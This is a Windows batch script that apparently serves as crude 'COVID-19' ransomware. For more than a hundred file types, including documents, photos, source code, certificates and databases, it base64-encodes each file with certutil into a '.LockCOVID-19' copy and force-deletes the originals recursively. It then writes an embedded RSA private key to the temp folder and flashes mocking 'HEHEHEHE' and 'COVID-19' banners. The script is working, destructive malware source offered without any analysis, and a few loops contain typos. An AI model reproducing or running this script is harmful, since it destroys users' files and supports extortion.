for %%a in (*.w3x) do certutil -encode "%%~a" "%%~na.w3x.LockCOVID-19"
del /s /f /q *.w3x
for %%a in (*.fsh) do certutil -encode "%%~a" "%%~na.fsh.LockCOVID-19"
del /s /f /q *.fsh
for %%a in (*.ntl) do certutil -encode "%%~a" "%%~na.ntl.LockCOVID-19"
del /s /f /q *.ntl
for %%a in (*.arch00) do certutil -encode "%%~a" "%%~na.arch00.LockCOVID-19"
del /s /f /q *.arch00
for %%a in (*.lvl) do certutil -encode "%%~a" "%%~na.lvl.LockCOVID-19"
del /s /f /q *.lvl
for %%a in (*.snx) do certutil -encode "%%~a" "%%~na.snx.LockCOVID-19"
del /s /f /q *.snx
for %%a in (*.cfr) do certutil -encode "%%~a" "%%~na.cfr.LockCOVID-19"
del /s /f /q *.cfr
for %%a in (*.ff) do certutil -encode "%%~a" "%%~na.ff.LockCOVID-19"
del /s /f /q *.ff
for %%a in (*.vpp_pc) do certutil -encode "%%~a" "%%~na.vpp_pc.LockCOVID-19"
del /s /f /q *.vpp_pc
for %%a in (*.lrf) do certutil -encode "%%~a" "%%~na.lrf.LockCOVID-19"
del /s /f /q *.lrf
for %%a in (*.m2) do certutil -encode "%%~a" "%%~na.m2.LockCOVID-19"
del /s /f /q *.m2
for %%a in (*.mcmeta) do certutil -encode "%%~a" "%%~na.mcmeta.LockCOVID-19"
del /s /f /q *.mcmeta
for %%a in (*.vfs0) do certutil -encode "%%~a" "%%~na.vfs0.LockCOVID-19"
del /s /f /q *.vfs0
for %%a in (*.mpqge) do certutil -encode "%%~a" "%%~na.mpqge.LockCOVID-19"
del /s /f /q *.mpqge
for %%a in (*.kdb) do certutil -encode "%%~a" "%%~na.kdb.LockCOVID-19"
del /s /f /q *.kdb
for %%a in (*.db0) do certutil -encode "%%~a" "%%~na.db0.LockCOVID-19"
del /s /f /q *.db0
for %%a in (*.dba) do certutil -encode "%%~a" "%%~na.dba.LockCOVID-19"
del /s /f /q *.dba
for %%a in (*.rofl) do certutil -encode "%%~a" "%%~na.rofl.LockCOVID-19"
del /s /f /q *.rofl
for %%a in (*.hkx) do certutil -encode "%%~a" "%%~na.hkx.LockCOVID-19"
del /s /f /q *.hkx
for %%a in (*.bar) do certutil -encode "%%~a" "%%~na.bar.LockCOVID-19"
del /s /f /q *.bar
for %%a in (*.upk) do certutil -encode "%%~a" "%%~na.upk.LockCOVID-19"
del /s /f /q *.upk
for %%a in (*.das) do certutil -encode "%%~a" "%%~na.das.LockCOVID-19"
del /s /f /q *.das
for %%a in (*.iwi) do certutil -encode "%%~a" "%%~na.iwi.LockCOVID-19"
del /s /f /q *.iwi
for %%a in (*.litemod) do certutil -encode "%%~a" "%%~na.litemod.LockCOVID-19"
del /s /f /q *.litemod
for %%a in (*.asset) do certutil -encode "%%~a" "%%~na.asset.LockCOVID-19"
del /s /f /q *.asset
for %%a in (*.forge) do certutil -encode "%%~a" "%%~na.forge.LockCOVID-19"
del /s /f /q *.forge
for %%a in (*.ltx) do certutil -encode "%%~a" "%%~na.ltx.LockCOVID-19"
del /s /f /q *.ltx
for %%a in (*.bsa) do certutil -encode "%%~a" "%%~na.bsa.LockCOVID-19"
del /s /f /q *.bsa
for %%a in (*.apk) do certutil -encode "%%~a" "%%~na.apk.LockCOVID-19"
del /s /f /q *.apk
for %%a in (*.re4) do certutil -encode "%%~a" "%%~na.re4.LockCOVID-19"
del /s /f /q *.re4
for %% a in (*.sav) do certutil -encode "%%~a" "%%~na.sav.LockCOVID-19"
del /s /f /q *.sav
for %%a in (*.lbf) do certutil -encode "%%~a" "%%~na.lbf.LockCOVID-19"
del /s /f /q *.lbf
for %%a in (*.slm) do certutil -encode "%%~a" "%%~na.slm.LockCOVID-19"
del /s /f /q *.slm
for %%a in (*.py) do certutil -encode "%%~a" "%%~na.py.LockCOVID-19"
del /s /f /q *.py
for %%a in (*.m3u) do certutil -encode "%%~a" "%%~na.m3u.LockCOVID-19"
del /s /f /q *.m3u
for %%a in (*.flv) do certutil -encode "%%~a" "%%~na.flv.LockCOVID-19"
del /s /f /q *.flv
for %%a in (*.js) do certutil -encode "%%~a" "%%~na.js.LockCOVID-19"
del /s /f /q *.js
for %%a in (*.css) do certutil -encode "%%~a" "%%~na.css.LockCOVID-19"
del /s /f /q *.css
for %%a in (*.rb) do certutil -encode "%%~a" "%%~na.rb.LockCOVID-19"
del /s /f /q *.rb
for %%a in (*.png) do certutil -encode "%%~a" "%%~na.png.LockCOVID-19"
del /s /f /q *.png
for %%a in (*.jpeg) do certutil -encode "%%~a" "%%~na.jpeg.LockCOVID-19"
del /s /f /q *.jpeg
for %%a in (*.txt) do certutil -encode "%%~a" "%%~na.txt.LockCOVID-19"
del /s /f /q *.txt
for %%a in (*.p7c) do certutil -encode "%%~a" "%%~na.p7c.LockCOVID-19"
del /s /f /q *.p7c
for %%a in (*.p12) do certutil -encode "%%~a" "%%~na.p12.LockCOVID-19"
del /s /f /q *.p12
for %%a in (*.pfx) do certutil -encode "%%~a" "%%~na.pfx.LockCOVID-19"
del /s /f /q *.pfx
for %%a in (*.pem) do certutil -encode "%%~a" "%%~na.pem.LockCOVID-19"
del /s /f /q *.pem
for %%a in (*.crt) do certutil -encode "%%~a" "%%~na.crt.LockCOVID-19"
del /s /f /q *.crt
for %%a in (*.cer) do certutil -encode "%%~a" "%%~na.cer.LockCOVID-19"
del /s /f /q *.cer
for %%a in (*.x3f) do certutil -encode "%%~a" "%%~na.x3f.LockCOVID-19"
del /s /f /q *.x3f
for %%a in (*.srw) do certutil -encode "%%~a" "%%~na.srw.LockCOVID-19"
del /s /f /q *.srw
for %%a in (*.pef) do certutil -encode "%%~a" "%%~na.pef.LockCOVID-19"
del /s /f /q *.pef
for %%a in (*.ptx) do certutil -encode "%%~a" "%%~na.ptx.LockCOVID-19"
del /s /f /q *.ptx
for %%a in (*.r3d) do certutil -encode "%%~a" "%%~na.r3d.LockCOVID-19"
del /s /f /q *.r3d
for %%a in (*.rw2) do certutil -encode "%%~a" "%%~na.rw2.LockCOVID-19"
del /s /f /q *.rw2
for %%a in (*.rw1) do certutil -encode "%%~a" "%%~na.rw1.LockCOVID-19"
del /s /f /q *.rw1
for %%a in (*.raw) do certutil -encode "%%~a" "%%~na.raw.LockCOVID-19"
del /s /f /q *.raw
for %%a in (*.raf) do certutil -encode "%%~a" "%%~na.raf.LockCOVID-19"
del /s /f /q *.raf
for %%a in (*.orf) do certutil -encode "%%~a" "%%~na.orf.LockCOVID-19"
del /s /f /q *.orf
for %%a in (*.nrw) do certutil -encode "%%~a" "%%~na.nrw.LockCOVID-19"
del /s /f /q *.nrw
for %%a in (*.mrwref) do certutil -encode "%%~a" "%%~na.mrwref.LockCOVID-19"
del /s /f /q *.mrwref
for %%a in (*.mef) do certutil -encode "%%~a" "%%~na.mef.LockCOVID-19"
del /s /f /q *.mef
for %%a in (*.erf) do certutil -encode "%%~a" "%%~na.erf.LockCOVID-19"
del /s /f /q *.erf
for %%a in (*.kdc) do certutil -encode "%%~a" "%%~na.kdc.LockCOVID-19"
del /s /f /q *.kdc
for %%a in (*.dcr) do certutil -encode "%%~a" "%%~na.dcr.LockCOVID-19"
del /s /f /q *.dcr
for %%a in (*.cr2) do certutil -encode "%%~a" "%%~na.cr2.LockCOVID-19"
del /s /f /q *.cr2
for %%a in (*.crw) do certutil -encode "%%~a" "%%~na.crw.LockCOVID-19"
del /s /f /q *.crw
for %%a in (*.sr2) do certutil -encode "%%~a" "%%~na.sr2.LockCOVID-19"
del /s /f /q *.sr2
for %%a in (*.srf) do certutil -encode "%%~a" "%%~na.srf.LockCOVID-19"
del /s /f /q *.srf
for %%a in (*.arw) do certutil -encode "%%~a" "%%~na.arw.LockCOVID-19"
del /s /f /q *.arw 
for %%a in (*.3fr) do certutil -encode "%%~a" "%%~na.3fr.LockCOVID-19"
del /s /f /q *.3fr
for %%a in (*.dng) do certutil -encode "%%~a" "%%~na.dng.LockCOVID-19"
del /s /f /q *.dng
for %%a in (*.jpe) do certutil -encode "%%~a" "%%~na.jpe.LockCOVID-19"
del /s /f /q *.jpe
for %%a in (*.jpg) do certutil -encode "%%~a" "%%~na.jpg.LockCOVID-19"
del /s /f /q *.jpg
for %%a in (*.cdr) do certutil -encode "%%~a" "%%~na.cdr.LockCOVID-19"
del /s /f /q *.cdr
for %%a in (*.pdf) do certutil -encode "%%~a" "%%~na.pdf.LockCOVID-19"
del /s /f /q *.pdf
for %%a in (*.pdd) do certutil -encode "%%~a" "%%~na.pdd.LockCOVID-19"
del /s /f /q *.pdd
for %%a in (*.psd) do certutil -encode "%%~a" "%%~na.psd.LockCOVID-19"
del /s /f /q *.psd
for %%a in (*.dbf) do certutil -encode "%%~a" "%%~na.dbf.LockCOVID-19"
del /s /f /q *.dbf
for %%a in (*.mdf) do certutil -encode "%%~a" "%%~na.mdf.LockCOVID-19"
del /s /f /q *.mdf
for %%a in (*.wb2) do certutil -encode "%%~a" "%%~na.wb2.LockCOVID-19"
del /s /f /q *.wb2
for %%a in (*.rtf) do certutil -encode "%%~a" "%%~na.rtf.LockCOVID-19"
del /s /f /q *.rtf
for %%a in (*.wpd) do certutil -encode "%%~a" "%%~na.wpd.LockCOVID-19"
del /s /f /q *.wpd
for %%a in (*.dxg) do certutil -encode "%%~a" "%%~na.wpd.LockCOVID-19"
del /s /f /q *.dxg
for %%a in (*.xf) do certutil -encode "%%~a" "%%~na.xf.LockCOVID-19"
del /s /f /q *.xf
for %%a in (*.dwg) do certutil -encode "%%~a" "%%~na.dwg.LockCOVID-19"
del /s /f /q *.dwg
for %%a in (*.pst) do certutil -encode "%%~a" "%%~na.pst.LockCOVID-19"
del /s /f /q *.pst
for %%a in (*.accdb) do certutil -encode "%%~a" "%%~na.accdb.LockCOVID-19"
del /s /f /q *.accdb
for %%a in (*.mdb) do certutil -encode "%%~a" "%%~na.mdb.LockCOVID-19"
del /s /f /q *.mdb
for %%a in (*.pptm) do certutil -encode "%%~a" "%%~na.pptm.LockCOVID-19"
del /s /f /q *.pptm
for %%a in (*.pptx) do certutil -encode "%%~a" "%%~na.pptx.LockCOVID-19"
del /s /f /q *.pptx
for %%a in (*.ppt) do certutil -encode "%%~a" "%%~na.ppt.LockCOVID-19"
del /s /f /q *.ppt
for %%a in (*.xlk) do certutil -encode "%%~a" "%%~na.xlk.LockCOVID-19"
del /s /f /q *.xlk
for %%a in (*.xlsb) do certutil -encode "%%~a" "%%~na.xlsb.LockCOVID-19"
del /s /f /q *.xlsb
for %%a in (*.xlsm) do certutil -encode "%%~a" "%%~na.xlsm.LockCOVID-19"
del /s /f /q *.xlsm
for %%a in (*.xlsx) do certutil -encode "%%~a" "%%~na.xlsx.LockCOVID-19"
del /s /f /q *.xlsx
for %%a in (*.xls) do certutil -encode "%%~a" "%%~na.xls.LockCOVID-19"
del /s /f /q *.xls
for %%a in (*.wps) do certutil -encode "%%~a" "%%~na.wps.LockCOVID-19"
del /s /f /q *.wps
for %%a in (*.docm) do certutil -encode "%%~a" "%%~na.docm.LockCOVID-19"
del /s /f /q *.docm
for %%a in (*.docx) do certutil -encode "%%~a" "%%~na.docx.LockCOVID-19"
del /s /f /q *.docx
for %%a in (*.doc) do certutil -encode "%%~a" "%%~na.doc.LockCOVID-19"
del /s /f /q *.doc
for %%a in (*.odb) do certutil -encode "%%~a" "%%~na.odb.LockCOVID-19"
del /s /f /q *.odb
for %%a in (*.odc) do certutil -encode "%%~a" "%%~na.odc.LockCOVID-19"
del /s /f /q *.odc
for %%a in (*.odm) do certutil -encode "%%~a" "%%~na.odm.LockCOVID-19"
del /s /f /q *.odm
for %%a in (*.odp) do certutil -encode "%%~a" "%%~na.odp.LockCOVID-19"
del /s /f /q *.odp
for %%a in (*.ods) do certutil -encode "%%~a" "%%~na.ods.LockCOVID-19"
del /s /f /q *.ods
for %%a in (*.odt) do certutil -encode "%%~a" "%%~na.odt.LockCOVID-19"
del /s /f /q *.odt
echo -----BEGIN RSA PRIVATE KEY----->>"%temp%\IKV"
echo MIISKQIBAAKCBAEAmfR9Q2IzhrTcIwBeKULVif54/bSGs22SFuywzvF5LKzz+caK>>"%temp%\IKV"
echo uTjBlPSV2uSibd31RVcT+oV68/KkKwc1yQmZlAu24QRAeUpMBwW3c3w8Ae1AFFb9>>"%temp%\IKV"
echo 8YUTVVn1Q+eIe265MFMRytfD6NIlj7w+HQhNzJZWmwW/373t0MnVVCvXuRZgjEXF>>"%temp%\IKV"
echo 7RY6yLwtefDrjvxGLxLKrupl3arPMXcnpMR+1XxIZaslheFNrN0SNgJoFDAssdLS>>"%temp%\IKV"
echo CBFFTgdYRSVGr9B0lcrtOFMxKNOiO1FkIC7qVVZC3eaEVJXCuoJaoCTZQ8dtuYEm>>"%temp%\IKV"
echo TaRL+0PMshPCJaIl7dPiFnKqulPivmkQwnWsytsP0iAcxHgRk3t3OSOk405jYrgH>>"%temp%\IKV"
echo GJZu5x1KncynH9VaEszNgY7XFIWuZPX2oycW2H7yWoMVRhxbO819Hxe0O7doPkWN>>"%temp%\IKV"
echo eG7tYqhFMlgWdeT9R7wKuOGdszyM6Ex2ysvMbAaPkBzwJpLFNXt2a/skAKI0No+4>>"%temp%\IKV"
echo EPQi7jWIJaReSEkXQcpo/xzWzA9fFDjb/yxeiegnYsvAXbCTxR5RF0XCWxdyc2mw>>"%temp%\IKV"
echo hkynTasWuAoeWulxR20jzL6e6Or3YLWHWo81RRoyPNhTTB8qlvQUIioaAIe/sbBF>>"%temp%\IKV"
echo yA6WfEyKe2bd04aIRo8ZTG/c7gEqXahHnpYZPeFox9KI3nALs1gWaOil5YeiyPYX>>"%temp%\IKV"
echo mU50BqG2gyW60cM6NDkGwRX1g4EgtHmAyV41bQi0H4aOPKMU3ovJm4Z4YDi+LynK>>"%temp%\IKV"
echo rN3NOEW/53v9fjQpShihYzttOHazWph6Ap0PTZYNJpbdE3r+eFxf9rdqIfxLpFMZ>>"%temp%\IKV"
echo 0V9z8tZqzfSax9wu9JZBwMyFJhrgEqTqsMxUAUR+/7jlhkC2u7kc7K3kIi2O4Pr9>>"%temp%\IKV"
echo t9kfCOT5yCJ23cJ+Xe7inPemEX7f9X1fCGrdW1WH+srUdBQB8FFwC8v73yWiAZ5b>>"%temp%\IKV"
echo fB7b2zwEKEF6mn2qoBqOoSzfNYNj/4ZxjTkNkf716emt6A2w6PtUg3EIH9kz4ufJ>>"%temp%\IKV"
echo sOtrZH54ejyPmZtEDUdEmEmZgPsYZLyG3/YnUQfhsar6HyJya2yk1QMmCWKtMWst>>"%temp%\IKV"
echo woXSkSxtkavYpy4mMeGEfEXD0I7+ZDOv6WUoEELZoBRZ05eYAX6eTlD0hulLzs48>>"%temp%\IKV"
echo AZbqpAEdmLQjdoDa9mSmPUG+8apQ1uk46PA2g4Vho3PdtNd5EXuCfgf/L5mcz0wh>>"%temp%\IKV"
echo 0j2w07l4hpDXko5LYVqXtKZ5w7jVDBSoseGQcSUc2F98VsyXjCNQViu1Eja1NRAY>>"%temp%\IKV"
echo KhK6VsB3miBN27d6y2wNRxxpUbm5LCektWUOhZ9YVdWTuAc+xNAelChJ6LZHP4P1>>"%temp%\IKV"
echo DYhvnAIhOXlhbaceHa7KomFoMREslR89s9kHtwIDAQABAoIEAHmKrhWzglA3mo87>>"%temp%\IKV"
echo bBsQ+3ps3uIUUj93Il1c0R0fP/XIOPiZCM2/g/xvt5rO43jvQQJUA57FIFNU3Mxn>>"%temp%\IKV"
echo bcvf+1IIiYFNlQTsZecpWTIgA1PWFL+6CdNRpvi8A0hvkq03tZX0DtjfzHeS6Dp4>>"%temp%\IKV"
echo d2T+OEVq7saGHHur+wLZRMSltDIX+3LiZqaM5S2yegiJ7b29Zj8li8PZo0AD6Hz5>>"%temp%\IKV"
echo v99xjVxHOPSi0AXI4ES3ZvgioD5H5hEhCdV6pQc7/zDfg9WrMU9MnEjaTLYZljtU>>"%temp%\IKV"
echo P0K1JyTl6/Y5VYFdlhUeciN509iRqgtIbY/gRGgCl6iCtsR1JZKDszrbnfNp5FlE>>"%temp%\IKV"
echo owmSUy73EJ9n4K4uyFlxoKcIf9U//nBiLp/3q2hkFJNNjScxjWHIM/mzZhN6kjp8>>"%temp%\IKV"
echo gBE/++ZBGl3gnLv0CQbGbKBOW2jFm9OFn3FTya8Yf0CGkHzUoiyuxJw+6fwlsmx2>>"%temp%\IKV"
echo aVYi3Kjv6Qjx/5nER1K4vL30z/B8HdJxVfR0eNssgeaNxC03Htg+zvOQtfb1r69M>>"%temp%\IKV"
echo UEo8ogonsGhryNtuWsrE62n/FbhKY33AE6+C9pX3mwECZAKLx3WHMTsjxlrFnTTJ>>"%temp%\IKV"
echo OymAY6LBUqX8do5jEIGKAhcSu+JtSSYjroOJGL7awn03saqbzBxAPs28hmOTofm8>>"%temp%\IKV"
echo r4YAo77ZpJoUmR9av7H/uflqqgXw/FaPTf7lQJHuzYCYPcejSy9F9ilIm/jcARlj>>"%temp%\IKV"
echo bSaMvDi7r1kpVYZ9wRnpySD+H0+IMvS+FAEN9CaI1ELqPkZghogX9nEn9T5i7DBB>>"%temp%\IKV"
echo mISjiliTJ5Po2FEBDyHBZJmwvbwkhnCPK6oKh2kNhBDKYUWPH4xe1zI9TlJhojbX>>"%temp%\IKV"
echo S9m4wHzFJPTcNwEUCGE6aOTPZHiAEE787ChMXWvTasjW4C+ZoR3RofrryLqIfbTA>>"%temp%\IKV"
echo Q+fjx8gqfv1qdney6yaxrXmX/cdkr1D66M3bQXETYlygfBEOf1evcXcYUmAO2U+5>>"%temp%\IKV"
echo AGiKgnjxCaGj/hiAtj6Ys5c4pH34jiC/VIN+MIhv/UJ+qupk+o6Og+gdNbSoOUuB>>"%temp%\IKV"
echo lbeT+a3eFf7lxV+bP30q4m7LtfMvhLlwPJy2c8EVNrNPpEB7DtKujJp3WsgGYCgM>>"%temp%\IKV"
echo AUPOC0n5FUV0Svggql46yX/3cz72ksysvGgfSzvU2bojQhfGWdgWqE9Q+2o9Il5G>>"%temp%\IKV"
echo SJoGDpLBcurlvOkrA3pQEUjv8uEllQYWiXcM74bowTqDs5spObkCVZiuqPF8Qwz8>>"%temp%\IKV"
echo ebQdGZqIDdq2LGledU7EcYpPCrqYx9W2L/nj2TgDBQ+MmoiDUrkPY8UjqhyTgEaJ>>"%temp%\IKV"
echo 9LXZ731ZUm7Japy2nR/uWMyTB47Hus2zCP5mw11CbcZbm4h0VeQScrrAwSqyY+jl>>"%temp%\IKV"
echo pwcTiBECggIBAMg4aM3ZhVIixjhZeGDbQiAJUk92Qfusxvdlt2mGHcpCPrJiQ02b>>"%temp%\IKV"
echo oS87vS0CPlRboigFxrEzgD6dqXQVEF/g28+wKYQI/ZtJwrCiYZzVqtYBtyLF8os/>>"%temp%\IKV"
echo Ynsv5frfKnIrIc2cxrxJ/2zMFZukCxBfqu1JvpJGoiqEySdsWMxnfL2FPxgQS6g1>>"%temp%\IKV"
echo EgL1LSTF07a/rSNbxZqyy0Tdc7gUE3km6igkt/UPOO0t+R0UDV75vZBEIcIhkxh6>>"%temp%\IKV"
echo L+5aB0fEbxwr3URthiyuJQtAO8nFllU0dDENe+xiPGA+4u/JCUfDClBpYjmFZ8ot>>"%temp%\IKV"
echo JN+z8kSlXVD1XN7IVL4ZhovdIWFygNpaPglycYtBrzu6ylt0VMoWv2lz9flQ/vqP>>"%temp%\IKV"
echo U4MwPHaMJxQRuCOo+NQEpPtg7Jzpfw9jmWfu7lltupWWdC8XMHUYw8DkY0NgLBCR>>"%temp%\IKV"
echo 5VjLeQPkIm0piNUCRsEUMX77I0txU+HmDYkjdI+gLutVXxUmp+1REzQnhTS3Gjqx>>"%temp%\IKV"
echo a6izg3tSldtb3QPnM9QGR2klCzMrSgZVnRr+yvw8ifl+9LmXHVf8VEF95oqo1DGG>>"%temp%\IKV"
echo ObDGW7lgXwJ4RIAiy5RU2aaNcwoM+i807uFjHiIGbt67SCqwogcleo8jTyrqikxf>>"%temp%\IKV"
echo uiUR10BzkASwCg5XQDjYwesAWaxwzkDdjOC9WMp/VaCUF9AKIqQC63PpAoICAQDE>>"%temp%\IKV"
echo 2Hd0hJZvDAC+VdLdWGxRIZGZkGRQrWCrLvXVXdUW840Sputk2TggzgNG7oSqwFMG>>"%temp%\IKV"
echo fpCzYhc3beGquqcuwjAxdfXUzj5IfhpLw8TNBkDTj9Flp4dMjMFBd4O3xWxskTyn>>"%temp%\IKV"
echo 7tSZSyh3Madd0gUy/NNiWxNHvmyiKynO+OPqtE0ya5YBk8fYqk3VDc7ALg4UWU+L>>"%temp%\IKV"
echo pFWvoI3zOZgf2nnPuJZv3cYAtE4k5Si/zUPXgOQisTbp+8laFfpyXwW40NkdMi3x>>"%temp%\IKV"
echo 9AN40Q2a46lt/LUqyMAAWlpi8Ipz7XtfWsU5Vp/fcggjLBaUoBpElL+BYgMNZmtj>>"%temp%\IKV"
echo 6pZYIGXyXMO0yXqdvp//DJJ4PEoXn5PFTq2qSPIZFsdS1kPc+psely7RMPSgv/XT>>"%temp%\IKV"
echo OjcnSwWn2qaLcCDVjdKqMa9NHPtdBHp92KHJ+pFEdO1uEediL+P7GoF6/ebjDCml>>"%temp%\IKV"
echo trxoV/sJ5zMqKE0kJND8SEUn4wka9A/qIo75ITqbHLtMFqL+1lD89L5ubXrClxuP>>"%temp%\IKV"
echo zJTvIWA3hfK5f186z/SQZefNAzXwq2tamdXW2BqueK+0ADtnFFiU/1CwmfkvJF8P>>"%temp%\IKV"
echo Kbh7EJgEbHu/+xLIazEQNvzsJ867D6jQyg3Vz5y6xbzKRHLhOrJa8cxjJboE+ofO>>"%temp%\IKV"
echo xwPyvqzKPq2K31U8qCZmZwJNegmtYc8jUaM8iwd6nwKCAgEAiTDtzy8fBTrCq9XS>>"%temp%\IKV"
echo gDt8wcrhVYVojPTEmLxfwrSdMPvXTg+6ojDjbyP16iNBZjgrklTy4nSxiTYq6FmO>>"%temp%\IKV"
echo kMPYmiTRLaGjdIZEGxgI3pghqOYgAHm2SeeyqUoWwaGsyfH4BZVJL7dch8YHgFAV>>"%temp%\IKV"
echo LLEAw/rl1AEGGTBHTPYWmmjGtm3Y37o6vRUwNEqfFjVfbjdEgZfefLPKSHOdWSKY>>"%temp%\IKV"
echo fUlG5R7T1d0KWqpHqb8VsmBZncKxhv3OdtUyhpW1q11T7O+5e6u4ZmElDOKElSsI>>"%temp%\IKV"
echo aXW5r+rXYQ+m4yP0B+2uqDdil9q97UAV8BiizY3VkWfl2xVk/1oxhtiisq9gsg7t>>"%temp%\IKV"
echo b7CqFXsPhiYJ1lmVUrkRaC/SFIXao2z2aeVPifLBW1GJbVz+2aBsb4qHKaAuQQ5V>>"%temp%\IKV"
echo e8v5T5gORcTENr+S+LlhALtpVoCn64C4cNonVoKFdz8Yv8fX9GzM4nvdtm6KrqUG>>"%temp%\IKV"
echo nyEtYSykL83ImIQ01J9aLWiCShhSU96q4FC1vjDTBOt/t4DonkYL41oyED/LvtII>>"%temp%\IKV"
echo tPJw5hB0MgWhXQ26znhXKPTDHuUP1S79xrl8Sj6AlzMLpvuVpF8zM344bME7dEWU>>"%temp%\IKV"
echo IEia7mEmQpY53fBh8K57N35czjuZgYSYIuDtAX2KCqWkpzGgklcCsHEF3uqsh1X8>>"%temp%\IKV"
echo XcHxSAU2E/rQR2lyL6DiP5OolhECggIBAJB7Lhq44s35KmaKCe7rYv2dvQfRAsBw>>"%temp%\IKV"
echo sZ6UJl6Is8pX03kYSXjJMzho3eDnWzsVVRtUNJNl8RJ/NX8h52oboFH9egXLp81/>>"%temp%\IKV"
echo uX9Y3w95goWGbzTE5TsbqRGLToPJhY6ef73nP+aQUtBCAs2LRMOq7OCpZppnO8dA>>"%temp%\IKV"
echo FTzUVD3GP089xmm79ZijT+OMce9/HlhzQT6GzVnOZ8JZyL3Al14O52SOjDGiJiVQ>>"%temp%\IKV"
echo ijtVx3DbKxgHqP3PEHht31ipRELmECYs2apY5197WhgQ+CBBtxwDI2Je7y7lzUnP>>"%temp%\IKV"
echo ypkvv8kZOtlAEpb2WlCWvxENeQ7XSNRCE5rP6bAff5SH4CHHLJex/i+vI6ba4as7>>"%temp%\IKV"
echo NrRAzplJV2Fw5bZ4jHEbBFZMs1FaNIP0wdNbTHYry6frhgicsYztvu2q8DeSiTE6>>"%temp%\IKV"
echo A0pxgjcFEjED/e2neIUKD7UUPGtxB1IpcDwwx1NzGFCpgVV1JUHdQAOcbB4dt2Yw>>"%temp%\IKV"
echo M6ov2W8ko6aMTTFJADQ6TFGOtmPJOaywSsueZsaqYbv/NixPQC+jyadfFOfWbnYK>>"%temp%\IKV"
echo 7A4hEeLS1aqv7I8bCH7dYTNjvu8Q5ORkNt2jSsQRZvMASUidWaj/fJChO71+bm/A>>"%temp%\IKV"
echo y7EMTWFdNHWmg66W1RdaBOVZyyIO492Zoar1SoGW0K7VmH1w9VhDN4Q8IWWKqKW5>>"%temp%\IKV"
echo P9d1qXHbvg6TAoICADx8nFt0MJYdKCP994OOSo2342mPjArxPgupb8SNzRbh2Nel>>"%temp%\IKV"
echo P4PFiZya7pQf0VXHEAwDA8K+B0RY7ZZWhaL2Ja6jUzskMrhjhXS0i+8gnVRgXbtE>>"%temp%\IKV"
echo H74f8Ha3x/YRqUnC9sCZFKgEc4uWOK7qP8WYCI57Y8an7pfCZ69lbr4pG8IbEbH0>>"%temp%\IKV"
echo jVMQwefN+KDLoDWtNxQmSo0lOGCOJyPg661MyTZ+46i3vtvTIAzlgHbFv+RRibMi>>"%temp%\IKV"
echo X5TWQI+jtYsiX4xyZBJqAi6Ukq7oXIbh+uTjA3FtOxu+TJWP5vlMO9mgfSShimMz>>"%temp%\IKV"
echo Oj14ivEaZRV3ZT7Nakjv5q2tPzfOL5dpU2FPuM+qNtdKbRu55/dSlTKG+s8ePONn>>"%temp%\IKV"
echo ttBNK9LCNNFOgva5YjVfenTR+T5e1DCNdTHZSDuRYoaOaW2QSsTm/Tmv8U5e4zFc>>"%temp%\IKV"
echo 6PuYb9cyGGMFbzaJ4PihL00xGvHPFJ4KqdJHR7nGzo1h+oDuYIKdXTiiMAC9Y0z/>>"%temp%\IKV"
echo D2lFPxDAZUltRCDrIly4Nf03sWxH10cCs4gwiWtb55yAE3qSD3Sl4X3ft/n3Dana>>"%temp%\IKV"
echo nTe6PSZfFw7tDRcZettguCEd09eFiL1W3Z4nGdshwHaG6aCb8W7KEuyFB3+olI0f>>"%temp%\IKV"
echo PF6miMq0cbYlGEHzZ/5Kpvo+GHIRG6FzbrnJwFiDvoddac80Qp/dnuLS5QLa>>"%temp%\IKV"
echo -----END RSA PRIVATE KEY----->>"%temp%\IKV"
cls
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0c
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0c
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0c
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0c
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0f
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0f
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0f
echo        @     @  @@@@@@@ @     @ @@@@@@@ @     @ @@@@@@@ @     @ @@@@@@@ 
echo        @     @  @       @     @ @       @     @ @       @     @ @        
echo        @     @  @       @     @ @       @     @ @       @     @ @       
echo        @@@@@@@  @       @@@@@@@ @       @@@@@@@ @@@@@@@ @@@@@@@ @@@@@@@ 
echo        @     @  @@@@@@@ @     @ @@@@@@@ @     @ @       @     @ @       
echo        @     @  @       @     @ @       @     @ @       @     @ @       
echo        @     @  @       @     @ @       @     @ @       @     @ @       
echo        @     @  @@@@@@@ @     @ @@@@@@@ @     @ @@@@@@@ @     @ @@@@@@@ 
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
ping 1.1.1.1 -n 1 -w 5 >NUL
color a1
ping 1.1.1.1 -n 1 -w 5 >NUL
color 1a
cls
echo      @@@@@@   @@@@  @           @ @@@@@@@@ @@@@@@@            @@    @@@@@@@
echo      @       @    @  @         @      @    @       @         @ @    @     @
echo      @       @    @   @       @       @    @       @        @  @    @     @
echo      @       @    @    @     @        @    @       @  ----     @    @     @
echo      @       @    @     @   @         @    @       @           @    @@@@@@@
echo      @       @    @      @ @          @    @       @           @          @
echo      @@@@@@   @@@@        @       @@@@@@@@ @@@@@@@@         @@@@@@@ @@@@@@@
echo.
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0c
ping 1.1.1.1 -n 1 -w 5 >NUL
color cf
ping 1.1.1.1 -n 1 -w 5 >NUL
color 0c
